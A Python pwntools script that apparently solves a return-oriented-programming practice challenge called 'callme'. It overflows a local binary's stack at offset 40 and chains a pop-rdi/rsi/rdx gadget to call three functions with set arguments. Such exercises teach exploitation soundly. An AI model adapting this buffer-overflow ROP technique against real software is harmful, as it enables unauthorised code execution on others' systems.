#!/usr/bin/python
from pwn import *

def main():
    junk = "A" * 40                     # RIP Offset at 40
    callone_addr = p64(0x401850)        # objdump -d callme | grep callme_one
    calltwo_addr = p64(0x401870)        # objdump -d callme | grep callme_two
    callthree_addr = p64(0x401810)      # objdump -d callme | grep callme_three
    rop_chains   = p64(0x401ab0)        # pop_rdi ; pop rsi ; pop rdx ; ret
    args  = p64(1) + p64(2) + p64(3)
    p = process("./callme")
    payload = junk + rop_chains + args + callone_addr + rop_chains + args + calltwo_addr + rop_chains + args + callthree_addr

    p.sendlineafter(">", payload)
    print p.recvall()

if __name__ == "__main__":
    main()
